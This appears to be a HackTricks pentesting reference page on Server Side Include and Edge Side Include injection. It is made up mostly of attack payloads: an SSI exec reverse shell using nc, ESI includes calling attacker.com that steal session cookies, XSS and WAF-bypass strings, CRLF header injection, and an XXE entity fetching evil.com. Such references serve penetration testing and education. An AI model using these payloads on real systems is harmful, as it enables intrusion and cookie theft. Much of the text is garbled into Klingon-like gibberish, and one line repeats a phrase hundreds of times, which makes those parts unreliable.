# Server Side Inclusion/Edge Side Inclusion Injection

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Server Side Inclusion Basic Information

**(Introduction taken from [Apache docs](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) are directives that are **placed in HTML pages, and evaluated on the server** while the pages are being served. They let you **add dynamically generated content** to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.\
For example, you might place a directive into an existing HTML page, such as:

`<!--#echo var="DATE_LOCAL" -->`

And, when the page is served, this fragment will be evaluated and replaced with its value:

`Tuesday, 15-Jan-2013 19:28:54 EST`

The decision of when to use SSI, and when to have your page entirely generated by some program, is usually a matter of how much of the page is static, and how much needs to be recalculated every time the page is served. SSI is a great way to add small pieces of information, such as the current time - shown above. But if a majority of your page is being generated at the time that it is served, you need to look for some other solution.

You can infer the presence of SSI if the web application uses files with the extensions \*\* `.shtml`, `.shtm` or `.stm`\*\*, but it's not only the case.

A typical SSI expression has the following format:
```
<!--#directive param="value" -->
```
### Qap

To check for Server-Side Inclusion (SSI) and Edge-Side Inclusion (ESI) Injection vulnerabilities, you can follow these steps:

1. **Identify the target**: Determine the target website or application that you want to test for SSI or ESI Injection vulnerabilities.

2. **Inspect the source code**: Analyze the source code of the target application to identify any potential SSI or ESI injection points. Look for server-side scripting languages like PHP, ASP, or JSP, as well as any ESI tags or directives.

3. **Test for SSI Injection**: To test for SSI Injection, try injecting server-side include directives into user-controllable input fields or parameters. This can include file inclusion directives like `<!--#include virtual="file.txt" -->` or `<!--#exec cmd="ls" -->`. If the server processes these directives and includes the specified file or executes the command, it indicates a potential SSI Injection vulnerability.

4. **Test for ESI Injection**: To test for ESI Injection, look for user-controllable input fields or parameters that are used in ESI tags or directives. Try injecting ESI tags like `<esi:include src="http://attacker.com/malicious.esi" />` or `<esi:exec src="http://attacker.com/malicious.esi" />`. If the server processes these tags and includes or executes the specified ESI file, it indicates a potential ESI Injection vulnerability.

5. **Exploit the vulnerability**: If you find a SSI or ESI Injection vulnerability, you can exploit it to achieve various goals, such as executing arbitrary commands on the server, accessing sensitive files, or performing remote code execution.

6. **Mitigate the vulnerability**: To mitigate SSI and ESI Injection vulnerabilities, ensure that user-controllable input is properly validated and sanitized before being processed by the server. Use input validation techniques like whitelisting or input encoding to prevent malicious code injection.

By following these steps, you can effectively test for and exploit SSI and ESI Injection vulnerabilities in web applications. However, always ensure that you have proper authorization and legal permission before conducting any penetration testing activities.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

There is a problem **caching information or dynamic applications** as part of the content may have **varied** for the next time the content is retrieved. This is what **ESI** is used form, to indicate using ESI tags the **dynamic content that needs to be generated** before sending the cache version.\
if an **attacker** is able to **inject an ESI tag** inside the cache content, then, he could be able to i**nject arbitrary content** on the document before it's sent to the users.

### ESI Detection

The following **header** in a response from the server means that the server is using ESI:
```
Surrogate-Control: content="ESI/1.0"
```
**ghItlhvam** vaj **ESI vItlhutlh**.\
**vItlhutlh** **ghItlhvam** **'e' vItlhutlh** vaj **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh** **'e' vItlhutlh**
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI exploitation

[GoSecure created](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) a table to understand possible attacks that we can try against different ESI-capable software, depending on the functionality supported:

* **Includes**: Supports the `<esi:includes>` directive
* **Vars**: Supports the `<esi:vars>` directive. Useful for bypassing XSS Filters
* **Cookie**: Document cookies are accessible to the ESI engine
* **Upstream Headers Required**: Surrogate applications will not process ESI statements unless the upstream application provides the headers
* **Host Allowlist**: In this case, ESI includes are only possible from allowed server hosts, making SSRF, for example, only possible against those hosts

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Yes     |    Yes   |     Yes     |              Yes              |         No         |
|         Varnish Cache        |      Yes     |    No    |      No     |              Yes              |         Yes        |
|            Fastly            |      Yes     |    No    |      No     |               No              |         Yes        |
| Akamai ESI Test Server (ETS) |      Yes     |    Yes   |     Yes     |               No              |         No         |
|          NodeJS esi          |      Yes     |    Yes   |     Yes     |               No              |         No         |
|         NodeJS nodesi        |      Yes     |    No    |      No     |               No              |      Optional      |

#### XSS

The following ESI directive will load an arbitrary file inside the response of the server
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Bypass client XSS protection

#### qIbDaq yIqImHa' XSS protection

To bypass client XSS protection, you can try the following techniques:

1. **Use different encodings**: Encode the payload using different encodings such as URL encoding, HTML entity encoding, or JavaScript string encoding. This can help bypass client-side filters that only look for specific encodings.

2. **Use obfuscation techniques**: Obfuscate the payload by using techniques like character substitution, concatenation, or encoding. This can make it harder for client-side filters to detect and block the payload.

3. **Use alternative injection points**: Instead of injecting the payload directly into the vulnerable input field, try injecting it into other parts of the application that may not be protected by client-side filters. This can include HTTP headers, cookies, or hidden form fields.

4. **Leverage browser quirks**: Exploit browser quirks or vulnerabilities to bypass client-side filters. For example, some browsers may interpret certain characters differently, allowing you to bypass filters that are based on specific character patterns.

5. **Use polyglot payloads**: Craft payloads that are valid in multiple contexts, such as both HTML and JavaScript. This can help bypass client-side filters that only look for specific payload formats.

Remember to always test your bypass techniques thoroughly and ensure that they do not introduce any additional security risks.
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### qo'wI' 'oH

* qo'wI' 'oH qar'a'ghach 'oH
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* XSS-vaDmey HTTP\_ONLY cookie vItlhutlhla'ghach, response vItlhutlhla'ghachDaq qechmeyDI' reflect:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### qarDaS Local File

ghaH 'oH "Local File Inclusion" vItlhutlh.
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF stands for Carriage Return Line Feed. It is a special character sequence used to represent the end of a line in text files. In certain contexts, CRLF can be exploited to perform server-side inclusion (SSI) and edge-side inclusion (ESI) injection attacks.

In an SSI attack, an attacker can manipulate user input to inject malicious code into a server-side script. This code is then executed by the server, potentially leading to unauthorized access or data leakage.

Similarly, in an ESI injection attack, an attacker can exploit vulnerable web applications that use ESI to include content from external sources. By injecting malicious code into the ESI tags, the attacker can execute arbitrary commands on the server or retrieve sensitive information.

To prevent CRLF injection attacks, it is important to properly validate and sanitize user input before using it in server-side scripts or ESI tags. Additionally, web application firewalls and secure coding practices can help mitigate the risk of these attacks.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Qap QIm

Qap QIm vItlhutlh 'e' `Location` header vItlhutlh response DaH.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Qap Qoch

* Qap Qoch vIghajtaHvIS qap Qoch vIghajtaHvIS vItlhutlh.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Add header in response (useful to bypass "Content-Type: text/json" in a response with XSS)

* qarDaS 'ej response vItlhutlh (XSS vIlo'laHbe' "Content-Type: text/json" response)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF in Add header (**CVE-2019-2438)**

##### Description:

This vulnerability allows an attacker to inject arbitrary headers into HTTP responses, leading to potential attacks such as HTTP response splitting, cache poisoning, and cross-site scripting (XSS). The vulnerability exists due to improper validation of user-supplied input in the "Add header" functionality. By injecting CRLF characters (%0D%0A) into the header value, an attacker can manipulate the response headers and potentially exploit other vulnerabilities.

##### Exploitation:

To exploit this vulnerability, an attacker needs to craft a malicious request with the desired header value containing CRLF characters. The request is then sent to the target server, which processes the input without proper validation. As a result, the attacker's injected headers are included in the server's response, potentially leading to further attacks.

##### Mitigation:

To mitigate this vulnerability, it is recommended to implement proper input validation and sanitization techniques. Ensure that user-supplied input is properly encoded and does not contain any CRLF characters. Additionally, consider using security libraries or frameworks that provide built-in protection against HTTP response splitting and other related attacks. Regularly updating the software and applying security patches can also help prevent exploitation of this vulnerability.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

**tlhIngan Hol:**

qaStaHvIS debug maqtaghpu' jatlhqa' ghaH:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

By specifying the `xslt` value for the _dca_ parameter, it is feasible to include **`eXtensible Stylesheet Language Transformations (XSLT)`** based ESI. The inclusion causes the HTTP surrogate to retrieve the XML and XSLT files, with the latter filtering the former. Such XML files are exploitable for _XML External Entity (XXE)_ attacks, enabling attackers to execute SSRF attacks. However, the utility of this approach is limited since ESI includes already serve as an SSRF vector. Due to the absence of support in the underlying Xalan library, external DTDs are not processed, preventing local file extraction.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT file:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
QaQ lo'laHbe' XSLT pejatlh:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### References

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>qaStaHvIS AWS hacking</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
